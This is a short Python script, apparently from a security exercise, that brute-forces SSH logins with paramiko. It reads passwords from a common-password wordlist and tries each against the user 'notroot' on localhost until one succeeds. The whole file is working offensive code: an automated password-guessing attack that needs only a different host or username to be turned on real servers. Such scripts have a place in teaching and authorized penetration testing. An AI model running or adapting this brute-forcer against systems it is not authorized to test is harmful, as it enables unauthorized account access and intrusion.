from pwn import *
import paramiko

host = "127.0.0.1"
username = "notroot"
attempts = 0

with open("ssh-common-passwords.txt", "r") as password_lists:
    for password in password_lists:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname=host, username=username, password=password, timeout=1)
            print("[>] Valid password found: '{}'!".format(password))
            client.close()
            break
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))
        attempts += 1
